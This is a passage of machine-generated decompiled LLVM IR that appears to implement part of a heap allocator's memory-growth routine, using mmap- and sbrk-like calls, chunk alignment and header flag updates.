  %v1_805014f = load i32, i32* @global_var_805bd6c.63, align 4
  %v7_805014f = icmp ult i32 %v1_8050172, %v1_805014f
  br i1 %v7_805014f, label %dec_label_pc_805022a, label %dec_label_pc_805015f

dec_label_pc_805015f:                             ; preds = %dec_label_pc_8050148
  %v0_805015f = load i32, i32* @global_var_805bd70.64, align 16
  store i32 %v0_805015f, i32* %eax.global-to-local, align 4
  %v1_8050164 = load i32, i32* @global_var_805bd74.65, align 4
  %v5_805016a = icmp slt i32 %v0_805015f, %v1_8050164
  br i1 %v5_805016a, label %dec_label_pc_8050170, label %dec_label_pc_805022a

dec_label_pc_8050170:                             ; preds = %dec_label_pc_805015f
  %v2_8050172 = add i32 %v1_8050172, 10
  %v3_8050172 = add i32 %v2_8050172, %v0_805011b
  %v1_8050176 = sub i32 0, %v0_805011b
  store i32 %v1_8050176, i32* %eax.global-to-local, align 4
  %v2_8050178 = and i32 %v3_8050172, %v1_8050176
  store i32 %v2_8050178, i32* @ebx, align 4
  %tmp132 = icmp ugt i32 %v2_8050178, %v1_8050172
  br i1 %tmp132, label %dec_label_pc_8050184, label %dec_label_pc_805022a

dec_label_pc_8050184:                             ; preds = %dec_label_pc_8050170
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050191 = call i32 @function_8051618(i32 0, i32 %v2_8050178, i32 3, i32 34, i32 0, i32 0, i32 %v1_805014c, i32 %v1_805014c)
  store i32 %v8_8050191, i32* %eax.global-to-local, align 4
  %v10_8050199 = icmp eq i32 %v8_8050191, -1
  store i32 %v8_8050191, i32* %edx.global-to-local, align 4
  br i1 %v10_8050199, label %dec_label_pc_8050184.dec_label_pc_805022a_crit_edge, label %dec_label_pc_80501a4

dec_label_pc_8050184.dec_label_pc_805022a_crit_edge: ; preds = %dec_label_pc_8050184
  %v0_805022a.pre = load i32, i32* @global_var_805ba4c.57, align 4
  br label %dec_label_pc_805022a

dec_label_pc_80501a4:                             ; preds = %dec_label_pc_8050184
  %v1_80501a6 = urem i32 %v8_8050191, 8
  %v2_80501a6 = icmp eq i32 %v1_80501a6, 0
  store i32 %v1_80501a6, i32* %ecx.global-to-local, align 4
  br i1 %v2_80501a6, label %dec_label_pc_80501bf, label %dec_label_pc_80501ab

dec_label_pc_80501ab:                             ; preds = %dec_label_pc_80501a4
  %v0_80501b0 = load i32, i32* @ebx, align 4
  %v2_80501b2 = sub nsw i32 8, %v1_80501a6
  store i32 %v2_80501b2, i32* %eax.global-to-local, align 4
  %v2_80501b4 = add i32 %v2_80501b2, %v8_8050191
  store i32 %v2_80501b4, i32* %ecx.global-to-local, align 4
  %v2_80501b7 = sub i32 %v0_80501b0, %v2_80501b2
  store i32 %v2_80501b7, i32* %esi.global-to-local, align 4
  %v2_80501b9 = inttoptr i32 %v2_80501b4 to i32*
  store i32 %v2_80501b2, i32* %v2_80501b9, align 4
  br label %dec_label_pc_80501c9

dec_label_pc_80501bf:                             ; preds = %dec_label_pc_80501a4
  store i32 %v8_8050191, i32* %ecx.global-to-local, align 4
  %v1_80501c1 = inttoptr i32 %v8_8050191 to i32*
  store i32 0, i32* %v1_80501c1, align 4
  br label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501ab, %dec_label_pc_80501bf
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_80501ab ], [ @ebx, %dec_label_pc_80501bf ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_80501c9 = or i32 %storemerge, 2
  %v1_80501cc = load i32, i32* %ecx.global-to-local, align 4
  %v2_80501cc = add i32 %v1_80501cc, 4
  %v3_80501cc = inttoptr i32 %v2_80501cc to i32*
  store i32 %v1_80501c9, i32* %v3_80501cc, align 4
  %v0_80501cf = load i32, i32* @global_var_805bd70.64, align 16
  %v0_80501d4 = load i32, i32* @global_var_805bd90.66, align 16
  %v1_80501da = add i32 %v0_80501cf, 1
  %v1_80501db = load i32, i32* @global_var_805bd78.67, align 8
  %v2_80501db = sub i32 %v1_80501da, %v1_80501db
  %v8_80501db = xor i32 %v1_80501db, %v1_80501da
  %v9_80501db = xor i32 %v2_80501db, %v1_80501da
  %v10_80501db = and i32 %v9_80501db, %v8_80501db
  %v11_80501db = icmp slt i32 %v10_80501db, 0
  %v12_80501db = icmp eq i32 %v2_80501db, 0
  %v13_80501db = icmp slt i32 %v2_80501db, 0
  store i32 %v1_80501da, i32* @global_var_805bd70.64, align 16
  %v3_80501e6 = icmp ne i1 %v13_80501db, %v11_80501db
  %v4_80501e6 = or i1 %v12_80501db, %v3_80501e6
  %v7_80501e6 = select i1 %v4_80501e6, i32 %v1_80501db, i32 %v1_80501da
  store i32 %v7_80501e6, i32* @global_var_805bd78.67, align 8
  %v0_80501f2 = load i32, i32* @global_var_805bd84.68, align 4
  %v1_80501f7 = load i32, i32* @ebx, align 4
  %v2_80501f7 = add i32 %v1_80501f7, %v0_80501f2
  store i32 %v2_80501f7, i32* @global_var_805bd84.68, align 4
  %tmp89 = icmp ule i32 %v2_80501f7, %v0_80501d4
  %v5_8050204 = select i1 %tmp89, i32 %v0_80501d4, i32 %v2_80501f7
  store i32 %v5_8050204, i32* %edx.global-to-local, align 4
  %v1_8050207 = load i32, i32* @global_var_805bd88.69, align 8
  %v2_8050207 = add i32 %v1_8050207, %v2_80501f7
  store i32 %v5_8050204, i32* @global_var_805bd90.66, align 16
  %v1_8050213 = load i32, i32* @global_var_805bd94.70, align 4
  %tmp133 = icmp ule i32 %v2_8050207, %v1_8050213
  %v5_8050219 = select i1 %tmp133, i32 %v1_8050213, i32 %v2_8050207
  store i32 %v5_8050219, i32* %eax.global-to-local, align 4
  store i32 %v5_8050219, i32* @global_var_805bd94.70, align 4
  br label %dec_label_pc_80500d5

dec_label_pc_805022a:                             ; preds = %dec_label_pc_8050170, %dec_label_pc_8050184.dec_label_pc_805022a_crit_edge, %dec_label_pc_805015f, %dec_label_pc_8050148
  %v0_805022a = phi i32 [ %v0_805022a.pre, %dec_label_pc_8050184.dec_label_pc_805022a_crit_edge ], [ %v0_80500dd, %dec_label_pc_805015f ], [ %v0_80500dd, %dec_label_pc_8050170 ], [ %v0_80500dd, %dec_label_pc_8050148 ]
  store i32 %v0_805022a, i32* %eax.global-to-local, align 4
  %v1_8050233 = add i32 %v0_805022a, 4
  %v2_8050233 = inttoptr i32 %v1_8050233 to i32*
  %v3_8050233 = load i32, i32* %v2_8050233, align 4
  %v1_805023a = and i32 %v3_8050233, -4
  %v2_805023a = icmp eq i32 %v1_805023a, 0
  store i32 %v1_805023a, i32* @ebp, align 4
  %v1_8050240 = load i32, i32* @global_var_805bd68.71, align 8
  %v0_805024a = load i8, i8* @global_var_805bd80.72, align 128
  %v1_805024a = urem i8 %v0_805024a, 2
  %v2_805024a = icmp eq i8 %v1_805024a, 0
  %v1_8050251 = icmp eq i1 %v2_805024a, false
  %v1_805023a.op = sub i32 0, %v1_805023a
  %v2_8050248.neg = select i1 %v1_8050251, i32 %v1_805023a.op, i32 0
  %v2_8050240 = add i32 %v1_805014c, %v1_80500ea
  %v4_8050251 = add i32 %v2_8050240, %v1_8050240
  %v5_8050258 = add i32 %v4_8050251, %v2_8050248.neg
  store i32 %v5_8050258, i32* %eax.global-to-local, align 4
  %v1_805025c = sub i32 0, %v0_805011b
  store i32 %v1_805025c, i32* %edx.global-to-local, align 4
  %v2_8050260 = and i32 %v5_8050258, %v1_805025c
  store i32 %v2_8050260, i32* @esi, align 4
  %tmp90 = icmp slt i32 %v2_8050260, 1
  br i1 %tmp90, label %dec_label_pc_805027e, label %dec_label_pc_8050268

dec_label_pc_8050268:                             ; preds = %dec_label_pc_805022a
  store i32 %v2_8050260, i32* %stack_var_-92, align 4
  %v1_805026c = call i32 @function_805182c(i32 %v2_8050260)
  store i32 %v1_805026c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v10_8050277 = icmp eq i32 %v1_805026c, -1
  store i32 %v1_805026c, i32* @ebx, align 4
  %v1_805027c = icmp eq i1 %v10_8050277, false
  br i1 %v1_805027c, label %dec_label_pc_80502d5, label %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge

dec_label_pc_8050268.dec_label_pc_805027e_crit_edge: ; preds = %dec_label_pc_8050268
  %v0_805027e.pre = load i8, i8* @global_var_805bd80.72, align 128
  br label %dec_label_pc_805027e

dec_label_pc_805027e:                             ; preds = %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge, %dec_label_pc_805022a
  %v0_80502ab = phi i32 [ -1, %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge ], [ %v1_805025c, %dec_label_pc_805022a ]
  %v0_805027e = phi i8 [ %v0_805027e.pre, %dec_label_pc_8050268.dec_label_pc_805027e_crit_edge ], [ %v0_805024a, %dec_label_pc_805022a ]
  %v1_805027e = urem i8 %v0_805027e, 2
  %v2_805027e = icmp eq i8 %v1_805027e, 0
  br i1 %v2_805027e, label %dec_label_pc_805027e.dec_label_pc_8050293_crit_edge, label %dec_label_pc_8050287

dec_label_pc_805027e.dec_label_pc_8050293_crit_edge: ; preds = %dec_label_pc_805027e
  %v0_8050293.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050293

dec_label_pc_8050287:                             ; preds = %dec_label_pc_805027e
  %v2_805028b = add i32 %v1_805023a, %v1_805014c
  store i32 %v2_805028b, i32* %eax.global-to-local, align 4
  %v0_805028d = load i32, i32* @esi, align 4
  %v2_805028d = add i32 %v0_805028d, %v2_805028b
  %v5_805028f = and i32 %v2_805028d, %v1_805025c
  store i32 %v5_805028f, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050293

dec_label_pc_8050293:                             ; preds = %dec_label_pc_805027e.dec_label_pc_8050293_crit_edge, %dec_label_pc_8050287
  %v3_805029e = phi i32 [ %v0_8050293.pre, %dec_label_pc_805027e.dec_label_pc_8050293_crit_edge ], [ %v5_805028f, %dec_label_pc_8050287 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp91 = icmp ult i32 %v3_805029e, 1048576
  %v5_805029e = select i1 %tmp91, i32 1048576, i32 %v3_805029e
  store i32 %v5_805029e, i32* @esi, align 4
  %tmp134 = icmp ugt i32 %v5_805029e, %v1_8050172
  br i1 %tmp134, label %dec_label_pc_80502ab, label %dec_label_pc_80504f0

dec_label_pc_80502ab:                             ; preds = %dec_label_pc_8050293
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80502b8 = call i32 @function_8051618(i32 0, i32 %v5_805029e, i32 3, i32 34, i32 0, i32 0, i32 %v0_80502ab, i32 %v0_80502ab)
  store i32 %v8_80502b8, i32* %eax.global-to-local, align 4
  %v10_80502c0 = icmp eq i32 %v8_80502b8, -1
  store i32 %v8_80502b8, i32* @ebx, align 4
  br i1 %v10_80502c0, label %dec_label_pc_80504f0, label %dec_label_pc_80502cb

dec_label_pc_80502cb:                             ; preds = %dec_label_pc_80502ab
  %v0_80502cb = load i8, i8* @global_var_805bd80.72, align 1
  %v2_80502cb = and i8 %v0_80502cb, -2
  store i8 %v2_80502cb, i8* @global_var_805bd80.72, align 128
  %v1_80502d2 = load i32, i32* @esi, align 4
  %v2_80502d2 = add i32 %v1_80502d2, %v8_80502b8
  store i32 %v2_80502d2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80502d5

dec_label_pc_80502d5:                             ; preds = %dec_label_pc_8050268, %dec_label_pc_80502cb
  %v0_805039c = phi i32 [ -1, %dec_label_pc_8050268 ], [ %v2_80502d2, %dec_label_pc_80502cb ]
  %v0_80503aa = phi i32 [ %v1_805026c, %dec_label_pc_8050268 ], [ %v8_80502b8, %dec_label_pc_80502cb ]
  %v10_80502d5 = icmp eq i32 %v0_80503aa, -1
  br i1 %v10_80502d5, label %dec_label_pc_80504f0, label %dec_label_pc_80502de

dec_label_pc_80502de:                             ; preds = %dec_label_pc_80502d5
  %v0_80502e2 = load i32, i32* @global_var_805bd88.69, align 8
  %v1_80502e2 = load i32, i32* @esi, align 4
  %v2_80502e2 = add i32 %v1_80502e2, %v0_80502e2
  store i32 %v2_80502e2, i32* @global_var_805bd88.69, align 8
  %v2_80502e8 = add i32 %v1_805023a, %v0_805022a
  store i32 %v2_80502e8, i32* %ecx.global-to-local, align 4
  %v2_80502ea = sub i32 %v0_80503aa, %v2_80502e8
  %v7_80502ea = icmp ult i32 %v0_80503aa, %v2_80502e8
  %v12_80502ea = icmp eq i32 %v2_80502ea, 0
  %v1_80502ec = icmp eq i1 %v12_80502ea, false
  br i1 %v1_80502ec, label %dec_label_pc_8050305, label %dec_label_pc_80502ee

dec_label_pc_80502ee:                             ; preds = %dec_label_pc_80502de
  %v10_80502ee = icmp eq i32 %v0_805039c, -1
  %v1_80502f1 = icmp eq i1 %v10_80502ee, false
  br i1 %v1_80502f1, label %dec_label_pc_8050305, label %dec_label_pc_80502f3

dec_label_pc_80502f3:                             ; preds = %dec_label_pc_80502ee
  store i32 %v0_805022a, i32* %ecx.global-to-local, align 4
  %v2_80502f7 = add i32 %v1_80502e2, %v1_805023a
  %v1_80502fa = or i32 %v2_80502f7, 1
  store i32 %v1_80502fa, i32* %eax.global-to-local, align 4
  store i32 %v1_80502fa, i32* %v2_8050233, align 4
  br label %dec_label_pc_8050432

dec_label_pc_8050305:                             ; preds = %dec_label_pc_80502ee, %dec_label_pc_80502de
  %v0_8050305 = load i8, i8* @global_var_805bd80.72, align 1
  %v1_8050305 = sext i8 %v0_8050305 to i32
  store i32 %v1_8050305, i32* %eax.global-to-local, align 4
  %v2_805030a = urem i8 %v0_8050305, 2
  %v3_805030a = icmp eq i8 %v2_805030a, 0
  br i1 %v3_805030a, label %dec_label_pc_805031e, label %dec_label_pc_805030e

dec_label_pc_805030e:                             ; preds = %dec_label_pc_8050305
  br i1 %v2_805023a, label %dec_label_pc_805031e, label %dec_label_pc_8050312

dec_label_pc_8050312:                             ; preds = %dec_label_pc_805030e
  %v1_8050314 = icmp eq i1 %v7_80502ea, false
  br i1 %v1_8050314, label %dec_label_pc_805031e, label %dec_label_pc_8050316

dec_label_pc_8050316:                             ; preds = %dec_label_pc_8050312
  %v1_8050316 = and i32 %v1_8050305, -2
  %v4_8050316 = trunc i32 %v1_8050316 to i8
  store i32 %v1_8050316, i32* %eax.global-to-local, align 4
  store i8 %v4_8050316, i8* @global_var_805bd80.72, align 128
  br label %dec_label_pc_805031e

dec_label_pc_805031e:                             ; preds = %dec_label_pc_8050312, %dec_label_pc_805030e, %dec_label_pc_8050305, %dec_label_pc_8050316
  %v0_805031e = phi i8 [ %v0_8050305, %dec_label_pc_8050312 ], [ %v0_8050305, %dec_label_pc_805030e ], [ %v0_8050305, %dec_label_pc_8050305 ], [ %v4_8050316, %dec_label_pc_8050316 ]
  %v1_805031e = urem i8 %v0_805031e, 2
  %v2_805031e = icmp eq i8 %v1_805031e, 0
  br i1 %v2_805031e, label %dec_label_pc_805039c, label %dec_label_pc_8050327

dec_label_pc_8050327:                             ; preds = %dec_label_pc_805031e
  br i1 %v2_805023a, label %dec_label_pc_8050335, label %dec_label_pc_805032b

dec_label_pc_805032b:                             ; preds = %dec_label_pc_8050327
  store i32 %v2_80502ea, i32* %eax.global-to-local, align 4
  %v2_805032f = add i32 %v2_80502e2, %v2_80502ea
  store i32 %v2_805032f, i32* @global_var_805bd88.69, align 8
  br label %dec_label_pc_8050335

dec_label_pc_8050335:                             ; preds = %dec_label_pc_8050327, %dec_label_pc_805032b
  %v1_8050337 = urem i32 %v0_80503aa, 8
  %v2_8050337 = icmp eq i32 %v1_8050337, 0
  store i32 %v1_8050337, i32* %edx.global-to-local, align 4
  %v1_805033a = icmp eq i1 %v2_8050337, false
  br i1 %v1_805033a, label %dec_label_pc_8050342, label %dec_label_pc_805033c

dec_label_pc_805033c:                             ; preds = %dec_label_pc_8050335
  store i32 %v0_80503aa, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805034c

dec_label_pc_8050342:                             ; preds = %dec_label_pc_8050335
  %v2_8050347 = sub nsw i32 8, %v1_8050337
  store i32 %v2_8050347, i32* %eax.global-to-local, align 4
  %v2_8050349 = add i32 %v2_8050347, %v0_80503aa
  store i32 %v2_8050349, i32* @edi, align 4
  br label %dec_label_pc_805034c

dec_label_pc_805034c:                             ; preds = %dec_label_pc_805033c, %dec_label_pc_8050342
  %v0_8050359 = phi i32 [ 0, %dec_label_pc_805033c ], [ %v2_8050347, %dec_label_pc_8050342 ]
  %v2_805034c = add i32 %v1_80502e2, %v0_80503aa
  %v2_8050359 = add i32 %v0_8050359, %v1_805023a
  store i32 %v2_8050359, i32* %ecx.global-to-local, align 4
  %v2_805035c = add i32 %v2_8050359, %v2_805034c
  store i32 %v2_805035c, i32* %edx.global-to-local, align 4
  %v2_805035e = add i32 %v2_805035c, %v1_805014c
  %v5_8050361 = and i32 %v2_805035e, %v1_805025c
  %v2_8050368 = sub i32 %v5_8050361, %v2_805035c
  store i32 %v2_8050368, i32* %eax.global-to-local, align 4
  %v2_805036a = add i32 %v2_8050368, %v2_8050359
  store i32 %v2_805036a, i32* @esi, align 4
  store i32 %v2_805036a, i32* %stack_var_-92, align 4
  %v1_805036e = call i32 @function_805182c(i32 %v2_805036a)
  store i32 %v1_805036e, i32* %eax.global-to-local, align 4
  %v10_8050376 = icmp eq i32 %v1_805036e, -1
  store i32 %v1_805036e, i32* %edx.global-to-local, align 4
  %v1_805037b = icmp eq i1 %v10_8050376, false
  br i1 %v1_805037b, label %dec_label_pc_805038b, label %dec_label_pc_805037d

dec_label_pc_805037d:                             ; preds = %dec_label_pc_805034c
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050382 = call i32 @function_805182c(i32 0)
  store i32 %v1_8050382, i32* %eax.global-to-local, align 4
  store i32 %v1_8050382, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80503bf

dec_label_pc_805038b:                             ; preds = %dec_label_pc_805034c
  %v1_805038b = load i32, i32* @ebx, align 4
  %v7_805038b = icmp ult i32 %v1_805036e, %v1_805038b
  %v1_805038d = icmp eq i1 %v7_805038b, false
  br i1 %v1_805038d, label %dec_label_pc_80503c4, label %dec_label_pc_805038f

dec_label_pc_805038f:                             ; preds = %dec_label_pc_805038b
  %v0_805038f = load i8, i8* @global_var_805bd80.72, align 1
  %v2_805038f = and i8 %v0_805038f, -2
  store i8 %v2_805038f, i8* @global_var_805bd80.72, align 128
  store i32 %v2_805034c, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80503a3

dec_label_pc_805039c:                             ; preds = %dec_label_pc_805031e
  %v10_805039c = icmp eq i32 %v0_805039c, -1
  br i1 %v10_805039c, label %dec_label_pc_80503a7, label %dec_label_pc_80503a1

dec_label_pc_80503a1:                             ; preds = %dec_label_pc_805039c
  store i32 %v0_80503aa, i32* @edi, align 4
  br label %dec_label_pc_80503a3

dec_label_pc_80503a3:                             ; preds = %dec_label_pc_805038f, %dec_label_pc_80503a1
  %v0_80503c456 = phi i32 [ %v2_805034c, %dec_label_pc_805038f ], [ %v0_805039c, %dec_label_pc_80503a1 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80503c4

dec_label_pc_80503a7:                             ; preds = %dec_label_pc_805039c
  store i32 %v0_80503aa, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80503ae = call i32 @function_805182c(i32 0)
  store i32 %v1_80503ae, i32* %edx.global-to-local, align 4
  %v1_80503b5 = load i32, i32* @ebx, align 4
  %v2_80503b5 = sub i32 %v1_80503ae, %v1_80503b5
  %v1_80503b7 = load i32, i32* @esi, align 4
  %v2_80503b7 = sub i32 %v2_80503b5, %v1_80503b7
  store i32 %v2_80503b7, i32* %eax.global-to-local, align 4
  %v0_80503b9 = load i32, i32* @global_var_805bd88.69, align 8
  %v2_80503b9 = add i32 %v0_80503b9, %v2_80503b7
  store i32 %v2_80503b9, i32* @global_var_805bd88.69, align 8
  br label %dec_label_pc_80503bf

dec_label_pc_80503bf:                             ; preds = %dec_label_pc_805037d, %dec_label_pc_80503a7
  %v0_80503c455 = phi i32 [ %v1_8050382, %dec_label_pc_805037d ], [ %v1_80503ae, %dec_label_pc_80503a7 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80503c4

dec_label_pc_80503c4:                             ; preds = %dec_label_pc_805038b, %dec_label_pc_80503a3, %dec_label_pc_80503bf
  %v0_80503c9 = phi i32 [ %v1_805036e, %dec_label_pc_805038b ], [ %v0_80503c456, %dec_label_pc_80503a3 ], [ %v0_80503c455, %dec_label_pc_80503bf ]
  %v10_80503c4 = icmp eq i32 %v0_80503c9, -1
  br i1 %v10_80503c4, label %dec_label_pc_8050432, label %dec_label_pc_80503c9

dec_label_pc_80503c9:                             ; preds = %dec_label_pc_80503c4
  %v1_80503c9 = load i32, i32* @edi, align 4
  %v2_80503c9 = sub i32 %v0_80503c9, %v1_80503c9
  store i32 %v2_80503c9, i32* %edx.global-to-local, align 4
  %v1_80503cb = load i32, i32* @esi, align 4
  %v2_80503cb = add i32 %v1_80503cb, %v2_80503c9
  %v1_80503ce = or i32 %v2_80503cb, 1
  store i32 %v1_80503ce, i32* %eax.global-to-local, align 4
  store i32 %v1_80503c9, i32* @global_var_805ba4c.57, align 4
  %v2_80503d7 = add i32 %v1_80503c9, 4
  %v3_80503d7 = inttoptr i32 %v2_80503d7 to i32*
  store i32 %v1_80503ce, i32* %v3_80503d7, align 4
  %v0_80503da = load i32, i32* @global_var_805bd88.69, align 8
  %v1_80503da = load i32, i32* @esi, align 4
  %v2_80503da = add i32 %v1_80503da, %v0_80503da
  store i32 %v2_80503da, i32* @global_var_805bd88.69, align 8
  br i1 %v2_805023a, label %dec_label_pc_8050432, label %dec_label_pc_80503e4

dec_label_pc_80503e4:                             ; preds = %dec_label_pc_80503c9
  store i32 %v0_805022a, i32* %ecx.global-to-local, align 4
  %v1_80503e8 = add i32 %v1_805023a, -12
  %v1_80503eb = and i32 %v1_80503e8, -8
  store i32 %v1_80503eb, i32* %eax.global-to-local, align 4
  %v1_80503f0 = or i32 %v1_80503eb, 1
  store i32 %v1_80503f0, i32* %edx.global-to-local, align 4
  %v5_80503f3 = icmp ult i32 %v1_80503eb, 15
  store i32 %v1_80503f0, i32* %v2_8050233, align 4
  %v0_80503f9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80503f9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80503f9 = add i32 %v0_80503f9, 4
  %v3_80503f9 = add i32 %v2_80503f9, %v1_80503f9
  %v4_80503f9 = inttoptr i32 %v3_80503f9 to i32*
  store i32 5, i32* %v4_80503f9, align 4
  %v0_8050401 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050401 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050401 = add i32 %v0_8050401, 8
  %v3_8050401 = add i32 %v2_8050401, %v1_8050401
  %v4_8050401 = inttoptr i32 %v3_8050401 to i32*
  store i32 5, i32* %v4_8050401, align 4
  br i1 %v5_80503f3, label %dec_label_pc_8050432, label %dec_label_pc_805040b

dec_label_pc_805040b:                             ; preds = %dec_label_pc_80503e4
  %v0_805040b = load i32, i32* @global_var_805bd64.73, align 4
  store i32 %v0_805040b, i32* @ebx, align 4
  %v0_8050411 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050416 = add i32 %v0_8050411, 8
  store i32 %v1_8050416, i32* %eax.global-to-local, align 4
  store i32 %v1_8050416, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_805bd64.73, align 4
  %v1_8050424 = call i32 @function_805074d(i32 %v1_8050416)
  store i32 %v1_8050424, i32* %eax.global-to-local, align 4
  %v0_805042c = load i32, i32* @ebx, align 4
  store i32 %v0_805042c, i32* @global_var_805bd64.73, align 4
  br label %dec_label_pc_8050432

dec_label_pc_8050432:                             ; preds = %dec_label_pc_80503e4, %dec_label_pc_80503c9, %dec_label_pc_80503c4, %dec_label_pc_80502f3, %dec_label_pc_805040b
  %v0_8050432 = load i32, i32* @global_var_805bd88.69, align 8
  %v0_8050437 = load i32, i32* @global_var_805bd8c.74, align 4
  %v0_8050443 = load i32, i32* @global_var_805ba4c.57, align 4
  store i32 %v0_8050443, i32* @ebx, align 4
  %tmp92 = icmp ule i32 %v0_8050432, %v0_8050437
  %v5_8050449 = select i1 %tmp92, i32 %v0_8050437, i32 %v0_8050432
  store i32 %v5_8050449, i32* %edx.global-to-local, align 4
  %v1_805044c = load i32, i32* @global_var_805bd84.68, align 4
  %v2_805044c = add i32 %v1_805044c, %v0_8050432
  store i32 %v5_8050449, i32* @global_var_805bd8c.74, align 4
  %v1_8050458 = load i32, i32* @global_var_805bd94.70, align 4
  %tmp93 = icmp ule i32 %v2_805044c, %v1_8050458
  %v5_805045e = select i1 %tmp93, i32 %v1_8050458, i32 %v2_805044c
  store i32 %v5_805045e, i32* %eax.global-to-local, align 4
  store i32 %v5_805045e, i32* @global_var_805bd94.70, align 4
  %v1_805046a = add i32 %v0_8050443, 4
  %v2_805046a = inttoptr i32 %v1_805046a to i32*
  %v3_805046a = load i32, i32* %v2_805046a, align 4
  %v1_805046d = and i32 %v3_805046a, -4
  store i32 %v1_805046d, i32* %ecx.global-to-local, align 4
  %v10_8050470 = icmp ult i32 %v1_805046d, %v1_80500ea
  br i1 %v10_8050470, label %dec_label_pc_80504f0, label %dec_label_pc_8050476

dec_label_pc_8050476:                             ; preds = %dec_label_pc_8050432
  store i32 %v1_8050172, i32* %esi.global-to-local, align 4
  %v2_805047c = sub i32 %v1_805046d, %v1_8050172
  store i32 %v2_805047c, i32* %ecx.global-to-local, align 4
  %v2_805047e = add i32 %v0_8050443, %v1_8050172
  store i32 %v2_805047e, i32* %edx.global-to-local, align 4
  %v1_8050481 = or i32 %v1_8050172, 1
  store i32 %v1_8050481, i32* %eax.global-to-local, align 4
  store i32 %v2_805047e, i32* @global_var_805ba4c.57, align 4
  store i32 %v1_8050481, i32* %v2_805046a, align 4
  %v0_805048d.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805048d

dec_label_pc_805048d:                             ; preds = %dec_label_pc_80500f8, %dec_label_pc_8050476
  %v0_805048d = phi i32 [ %v5_805010b, %dec_label_pc_80500f8 ], [ %v0_805048d.pre, %dec_label_pc_8050476 ]
  %v1_805048d = or i32 %v0_805048d, 1
  store i32 %v1_805048d, i32* %ecx.global-to-local, align 4
  %v0_8050490 = load i32, i32* @ebx, align 4
  %v1_8050490 = add i32 %v0_8050490, 8
  store i32 %v1_8050490, i32* %ebx.global-to-local, align 4
  %v1_8050493 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050493 = add i32 %v1_8050493, 4
  %v3_8050493 = inttoptr i32 %v2_8050493 to i32*
  store i32 %v1_805048d, i32* %v3_8050493, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_8050498:                             ; preds = %dec_label_pc_804feaa
  %v5_805049e = sub i32 %v1_804fe8d, %v1_8050172
  store i32 %v5_805049e, i32* %eax.global-to-local, align 4
  %v2_80504a2 = add i32 %v1_80504af, %v1_8050172
  store i32 %v2_80504a2, i32* %edx.global-to-local, align 4
  %v1_80504a6 = or i32 %v1_8050172, 1
  store i32 %v2_80504a2, i32* @global_var_805ba50.58, align 16
  store i32 %v1_80504a6, i32* %v2_804fe87, align 4
  %v0_80504b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80504b4 = or i32 %v0_80504b2, 1
  store i32 %v1_80504b4, i32* %ecx.global-to-local, align 4
  %v0_80504b7 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80504b7, i32* @global_var_805ba5c.75, align 4
  store i32 %v0_80504b7, i32* @global_var_805ba60.60, align 32
  %v1_80504c3 = add i32 %v0_80504b7, 8
  %v2_80504c3 = inttoptr i32 %v1_80504c3 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v2_80504c3, align 4
  %v0_80504ca = load i32, i32* %edx.global-to-local, align 4
  %v1_80504ca = add i32 %v0_80504ca, 12
  %v2_80504ca = inttoptr i32 %v1_80504ca to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v2_80504ca, align 4
  %v0_80504d1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80504d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80504d1 = add i32 %v1_80504d1, 4
  %v3_80504d1 = inttoptr i32 %v2_80504d1 to i32*
  store i32 %v0_80504d1, i32* %v3_80504d1, align 4
  %v0_80504d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80504d4 = load i32, i32* %edx.global-to-local, align 4
  %v3_80504d4 = add i32 %v1_80504d4, %v0_80504d4
  %v4_80504d4 = inttoptr i32 %v3_80504d4 to i32*
  store i32 %v0_80504d4, i32* %v4_80504d4, align 4
  br label %dec_label_pc_80504e2

dec_label_pc_80504d9:                             ; preds = %dec_label_pc_804feb9
  store i32 %v1_8050172, i32* %ebx.global-to-local, align 4
  %v0_80504dd = load i32, i32* @ebp, align 4
  %v2_80504dd = or i32 %v1_8050172, 4
  %v3_80504dd = add i32 %v0_80504dd, %v2_80504dd
  %v4_80504dd = inttoptr i32 %v3_80504dd to i32*
  %v5_80504dd = load i32, i32* %v4_80504dd, align 4
  %v6_80504dd = or i32 %v5_80504dd, 1
  store i32 %v6_80504dd, i32* %v4_80504dd, align 4
  br label %dec_label_pc_80504e2

dec_label_pc_80504e2:                             ; preds = %dec_label_pc_8050498, %dec_label_pc_80504d9
  %v0_80504e2 = load i32, i32* @ebp, align 4
  %v1_80504e2 = add i32 %v0_80504e2, 8
  store i32 %v1_80504e2, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80504e7:                             ; preds = %dec_label_pc_804ffa9
